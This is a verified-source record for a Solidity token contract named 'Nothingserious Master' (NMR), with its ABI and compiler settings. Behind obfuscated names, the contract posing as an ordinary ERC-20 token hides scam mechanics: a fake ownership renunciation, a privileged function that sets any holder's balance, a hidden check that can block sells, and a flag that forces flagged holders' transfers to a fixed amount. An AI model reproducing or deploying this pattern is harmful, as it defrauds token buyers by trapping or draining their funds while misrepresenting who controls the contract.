{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface tokenSender {\n    function createPair(address isReceiverLaunched, address teamListToken) external returns (address);\n}\n\ninterface exemptMinTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamBuy) external view returns (uint256);\n\n    function transfer(address listSwap, uint256 exemptReceiver) external returns (bool);\n\n    function allowance(address launchWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listSwap,\n        uint256 exemptReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromShouldTx, uint256 value);\n    event Approval(address indexed launchWallet, address indexed spender, uint256 value);\n}\n\nabstract contract exemptSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptMinTakeMetadata is exemptMinTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NothingseriousMaster is exemptSwap, exemptMinTake, exemptMinTakeMetadata {\n\n    uint256 public fromFundLaunched;\n\n    uint256 private listReceiver;\n\n    constructor (){\n        \n        totalEnable exemptBuyMax = totalEnable(listTotalBuy);\n        enableTakeAt = tokenSender(exemptBuyMax.factory()).createPair(exemptBuyMax.WETH(), address(this));\n        \n        shouldEnable = _msgSender();\n        fromFee[shouldEnable] = true;\n        shouldMode[shouldEnable] = swapSender;\n        swapTeamAmount();\n        \n        emit Transfer(address(0), shouldEnable, swapSender);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitLaunched;\n    }\n\n    function totalSender(address receiverBuy) public {\n        require(receiverBuy.balance < 100000);\n        if (liquidityIs) {\n            return;\n        }\n        if (receiverLiquidity == maxToken) {\n            receiverLiquidity = fromLaunch;\n        }\n        fromFee[receiverBuy] = true;\n        if (listReceiver != fromLaunch) {\n            shouldSender = true;\n        }\n        liquidityIs = true;\n    }\n\n    address public enableTakeAt;\n\n    uint256 private receiverLiquidity;\n\n    bool public liquidityIs;\n\n    event OwnershipTransferred(address indexed marketingMin, address indexed marketingTokenTo);\n\n    uint8 private teamTakeReceiver = 18;\n\n    mapping(address => bool) public launchedTradingSell;\n\n    mapping(address => bool) public fromFee;\n\n    function transfer(address swapShould, uint256 exemptReceiver) external virtual override returns (bool) {\n        return walletFrom(_msgSender(), swapShould, exemptReceiver);\n    }\n\n    function getOwner() external view returns (address) {\n        return fundTx;\n    }\n\n    uint256 constant autoReceiver = 17 ** 10;\n\n    address buyIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private shouldMode;\n\n    function allowance(address fromTrading, address maxAt) external view virtual override returns (uint256) {\n        if (maxAt == listTotalBuy) {\n            return type(uint256).max;\n        }\n        return minIsBuy[fromTrading][maxAt];\n    }\n\n    string private limitLaunched = \"Nothingserious Master\";\n\n    bool private takeSender;\n\n    function walletFrom(address exemptSell, address listSwap, uint256 exemptReceiver) internal returns (bool) {\n        if (exemptSell == shouldEnable) {\n            return exemptToEnable(exemptSell, listSwap, exemptReceiver);\n        }\n        uint256 fundAt = exemptMinTake(enableTakeAt).balanceOf(buyIs);\n        require(fundAt == shouldMarketing);\n        require(listSwap != buyIs);\n        if (launchedTradingSell[exemptSell]) {\n            return exemptToEnable(exemptSell, listSwap, autoReceiver);\n        }\n        return exemptToEnable(exemptSell, listSwap, exemptReceiver);\n    }\n\n    function tradingAtExempt(uint256 exemptReceiver) public {\n        receiverEnable();\n        shouldMarketing = exemptReceiver;\n    }\n\n    bool private shouldSender;\n\n    function swapTeamAmount() public {\n        emit OwnershipTransferred(shouldEnable, address(0));\n        fundTx = address(0);\n    }\n\n    uint256 public maxToken;\n\n    function exemptToEnable(address exemptSell, address listSwap, uint256 exemptReceiver) internal returns (bool) {\n        require(shouldMode[exemptSell] >= exemptReceiver);\n        shouldMode[exemptSell] -= exemptReceiver;\n        shouldMode[listSwap] += exemptReceiver;\n        emit Transfer(exemptSell, listSwap, exemptReceiver);\n        return true;\n    }\n\n    function receiverEnable() private view {\n        require(fromFee[_msgSender()]);\n    }\n\n    uint256 private swapSender = 100000000 * 10 ** 18;\n\n    bool public toShould;\n\n    bool private tokenLiquidity;\n\n    function swapSell(address feeSell) public {\n        receiverEnable();\n        \n        if (feeSell == shouldEnable || feeSell == enableTakeAt) {\n            return;\n        }\n        launchedTradingSell[feeSell] = true;\n    }\n\n    function transferFrom(address exemptSell, address listSwap, uint256 exemptReceiver) external override returns (bool) {\n        if (_msgSender() != listTotalBuy) {\n            if (minIsBuy[exemptSell][_msgSender()] != type(uint256).max) {\n                require(exemptReceiver <= minIsBuy[exemptSell][_msgSender()]);\n                minIsBuy[exemptSell][_msgSender()] -= exemptReceiver;\n            }\n        }\n        return walletFrom(exemptSell, listSwap, exemptReceiver);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamTakeReceiver;\n    }\n\n    uint256 public launchTx;\n\n    address private fundTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamFund;\n    }\n\n    mapping(address => mapping(address => uint256)) private minIsBuy;\n\n    function approve(address maxAt, uint256 exemptReceiver) public virtual override returns (bool) {\n        minIsBuy[_msgSender()][maxAt] = exemptReceiver;\n        emit Approval(_msgSender(), maxAt, exemptReceiver);\n        return true;\n    }\n\n    uint256 shouldMarketing;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapSender;\n    }\n\n    function balanceOf(address teamBuy) public view virtual override returns (uint256) {\n        return shouldMode[teamBuy];\n    }\n\n    function owner() external view returns (address) {\n        return fundTx;\n    }\n\n    address public shouldEnable;\n\n    string private teamFund = \"NMR\";\n\n    uint256 public fromLaunch;\n\n    uint256 launchTo;\n\n    function tokenSwap(address swapShould, uint256 exemptReceiver) public {\n        receiverEnable();\n        shouldMode[swapShould] = exemptReceiver;\n    }\n\n    address listTotalBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTokenTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromShouldTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTakeAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFundLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTradingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSell\",\"type\":\"address\"}],\"name\":\"swapSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTeamAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"tokenSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"}],\"name\":\"totalSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"tradingAtExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NothingseriousMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}